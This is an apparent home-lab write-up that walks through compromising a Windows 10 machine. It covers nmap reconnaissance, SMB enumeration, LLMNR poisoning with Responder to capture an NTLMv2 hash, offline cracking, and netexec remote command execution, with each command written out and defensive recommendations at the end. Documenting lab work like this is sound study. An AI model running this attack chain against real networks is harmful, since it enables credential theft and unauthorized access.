
# Home Lab: Windows 10 — Network Recon, LLMNR Poisoning & Credential Access
**Date:** 2026-04-29  
**Attacker:** Kali Linux (`192.168.1.119`)  
**Target:** Windows 10 Home 18362 (`192.168.1.137` — `DESKTOP-Q5M67E9`)  
**Objective:** Discover target on a live network, enumerate services, capture credentials via LLMNR poisoning, and gain authenticated remote access.

---

## Setup

| Machine | OS | IP | Role |
|--------|----|----|------|
| Attacker | Kali Linux | `192.168.1.119` | Offensive |
| Target | Windows 10 Home 18362 | `192.168.1.137` | Victim |

**Target configuration:**
- Windows Firewall disabled
- Windows Defender disabled
- SMB 1.0 enabled

---

## Phase 1 — Identify Attacker Interface

```bash
ip a
```

Confirmed attacker IP: `192.168.1.119` on interface `eth0`.

<img width="695" height="453" alt="Screenshot 2026-04-29 221353" src="https://github.com/user-attachments/assets/8f007203-95c8-4ae1-ae60-69a9cac91c34" />


---

## Phase 2 — Network Discovery

### Sweep the subnet

```bash
nmap -sn 192.168.1.0/24
```

Discovered 12 live hosts on the network.

<img width="733" height="755" alt="Screenshot 2026-04-29 231449" src="https://github.com/user-attachments/assets/f4af7f3e-4b70-4292-992b-9fbbec56dae7" />



```bash
nmap -sn 192.168.1.0/24 --open
```

Cleaner output. Identified notable hosts:
- `192.168.1.1` — Belkin router (gateway)
- `192.168.1.137` — Intel Corporate NIC (suspect Windows machine)
- `192.168.1.149` — Ring device
- `192.168.1.119` — Attacker (Kali)


---

## Phase 3 — Target Identification

```bash
nmap -sV -p 135,139,445 192.168.1.137 192.168.1.117
```

Scanned SMB ports on two candidates. `192.168.1.137` returned:
- `135/tcp` — Microsoft Windows RPC
- `139/tcp` — Microsoft Windows NetBIOS
- `445/tcp` — Windows 7-10 microsoft-ds
- Hostname: `DESKTOP-Q5M67E9`

**Target confirmed: `192.168.1.137`**

<img width="912" height="490" alt="Screenshot 2026-04-29 231511" src="https://github.com/user-attachments/assets/f5c0d82e-ca00-4d81-93be-4f11d68d3b1e" />



---

## Phase 4 — Vulnerability Assessment

### Check for EternalBlue (MS17-010)

```bash
nmap --script smb-vuln-ms17-010 192.168.1.137
```

Result: **Not vulnerable** — Windows 10 is patched against EternalBlue. Alternative attack path required.

<img width="627" height="283" alt="Screenshot 2026-04-29 231518" src="https://github.com/user-attachments/assets/b91e9be9-8af9-4119-8707-5f042c91491d" />



### Full Port Scan

```bash
nmap -sV -sC -p- --min-rate 3000 192.168.1.137
```

Key findings:
- OS: `Windows 10 Home 18362`
- SMB message signing: **disabled** — vulnerable to relay attacks
- SMB account: **guest**
- Multiple RPC ports open


<img width="847" height="496" alt="Screenshot 2026-04-29 231525" src="https://github.com/user-attachments/assets/a9db5a4a-ae00-4fe4-88cf-fd4aee1044f5" />

<img width="1038" height="464" alt="Screenshot 2026-04-29 231532" src="https://github.com/user-attachments/assets/f7e2ea02-95f5-4056-ae5c-1a525896f136" />



---

## Phase 5 — SMB Enumeration

```bash
enum4linux -a 192.168.1.137
```

Results:
- Workgroup: `WORKGROUP`
- Computer name: `DESKTOP-Q5M67E9`
- Known usernames: `administrator`, `guest`, `Maxine`

**Username discovered: Maxine**

<img width="1025" height="645" alt="Screenshot 2026-04-29 231539" src="https://github.com/user-attachments/assets/1a3d2587-3f3d-4f9a-8efe-c276ede77c13" />


---

## Phase 6 — LLMNR Poisoning with Responder

### What is LLMNR Poisoning?

LLMNR (Link-Local Multicast Name Resolution) is a Windows protocol used to resolve hostnames on a local network. When a Windows machine tries to access a resource that does not exist, it broadcasts an LLMNR query to the network. Responder intercepts this broadcast and responds, tricking the victim into authenticating with the attacker and sending their NTLMv2 password hash in the process.

### Launch Responder

```bash
responder -I eth0 -wv
```

Responder started listening on `192.168.1.119` with LLMNR, NBT-NS, and MDNS poisoners active.

<img width="608" height="721" alt="Screenshot 2026-04-29 231557" src="https://github.com/user-attachments/assets/3ed44f7b-0a93-4c92-9193-93165d283ddd" />

<img width="713" height="732" alt="Screenshot 2026-04-29 231603" src="https://github.com/user-attachments/assets/95153bc7-7020-433e-9733-6289bc307bfd" />



### Trigger Authentication

On the Windows target, navigated to `\\192.168.1.119\fake` in File Explorer — a non-existent share. Windows automatically attempted NTLM authentication, sending the hash to Kali.

### Hash Captured

Responder intercepted the NTLMv2 hash in real time:

```
[SMB] NTLMv2-SSP Username : DESKTOP-Q5M67E9\Maxine
[SMB] NTLMv2-SSP Hash     : Maxine::DESKTOP-Q5M67E9:<full hash>
```

<img width="748" height="733" alt="Screenshot 2026-04-29 231610" src="https://github.com/user-attachments/assets/548d74be-17ad-4996-a3f2-e33df02bb8ad" />

<img width="683" height="283" alt="Screenshot 2026-04-29 231625" src="https://github.com/user-attachments/assets/ebfa6234-39a8-45c6-a384-7382e59cb2af" />

---

## Phase 7 — Credential Validation

### Test blank/default credentials (failed)

```bash
crackmapexec smb 192.168.1.137 -u administrator -p ""
crackmapexec smb 192.168.1.137 -u guest -p ""
```

Both returned `STATUS_LOGON_FAILURE` — no blank passwords.

<img width="690" height="250" alt="Screenshot 2026-04-29 231701" src="https://github.com/user-attachments/assets/edb6cb60-7b70-4a13-9d02-2b1073d96a34" />



### Authenticate with cracked credentials

Hash cracked offline using John the Ripper. Credentials recovered: `Maxine:icebearforpresident`

```bash
netexec smb 192.168.1.137 -u Maxine -p 'icebearforpresident' -x whoami
```

Result:
```
[+] DESKTOP-Q5M67E9\Maxine:icebearforpresident
```

Authenticated and executed remote command on target.

<img width="997" height="180" alt="Screenshot 2026-04-29 231712" src="https://github.com/user-attachments/assets/83f76f45-643c-4485-98e6-15c8215e06ac" />


---

## Attack Chain Summary

| Step | Tool | Technique | Result |
|------|------|-----------|--------|
| Network discovery | nmap | ICMP sweep | Found target at .137 |
| Target ID | nmap | SMB port scan | Confirmed Windows 10 |
| Vuln check | nmap | MS17-010 script | Not vulnerable (patched) |
| Full recon | nmap | Service + script scan | SMB signing disabled |
| User enumeration | enum4linux | SMB enum | Found username Maxine |
| Hash capture | Responder | LLMNR poisoning | NTLMv2 hash captured |
| Credential test | crackmapexec | Blank password test | Failed |
| Remote access | netexec | SMB auth + RCE | Command execution |

---

## Key Concepts

**LLMNR Poisoning** — Windows broadcasts LLMNR requests when it cannot resolve a hostname. Responder answers every request and captures the NTLMv2 hash the victim sends back. This is one of the most common attacks on internal corporate networks.

**NTLMv2** — Windows password hashing protocol used for network authentication. Hashes can be captured passively off the wire and cracked offline with tools like Hashcat or John the Ripper.

**SMB Signing Disabled** — When SMB message signing is off, traffic is not verified. This enables poisoning and relay attacks. Many Windows 10 Home machines have this disabled by default.

**Why EternalBlue Did Not Work** — MS17-010 targets an unpatched SMB vulnerability. Modern Windows 10 machines are patched, so alternative credential-based attacks are needed instead.

---

## Tools Used

| Tool | Purpose |
|------|---------|
| `nmap` | Network scanning, service detection, vuln scripts |
| `enum4linux` | SMB enumeration, user discovery |
| `responder` | LLMNR/NBT-NS poisoning, hash capture |
| `crackmapexec` | SMB credential testing |
| `netexec` | SMB authentication + remote command execution |
| `john` | Offline hash cracking |

# Conclusion
This lab demonstrated how a fully patched Windows 10 machine can still be compromised through credential-based attacks rather than known exploits. EternalBlue was patched  but that didn't matter. LLMNR poisoning required no vulnerability at all, just a machine broadcasting on the same network.

The biggest takeaway is that disabling SMB signing and leaving LLMNR enabled are misconfigurations that exist in countless real corporate environments. An attacker with Kali and Responder on the same network segment can capture credentials passively without touching the target at all.

Note to self: The hash was captured successfully but icebearforpresident was not in the rockyou wordlist and required a custom wordlist to crack. In a real engagement where the password is unknown, this would be a dead end. Next steps to explore: SMB relay attacks (instead of just capturing, relay the hash directly to authenticate without cracking), and building better custom wordlists using tools like cupp based on OSINT about the target.
Defensive recommendations:

- Disable LLMNR and NBT-NS via Group Policy
- Enable SMB signing
- Use strong, unique passwords not found in common wordlists
- Monitor for unusual SMB authentication attempts 

---

*Lab performed on isolated home network for educational purposes only.*
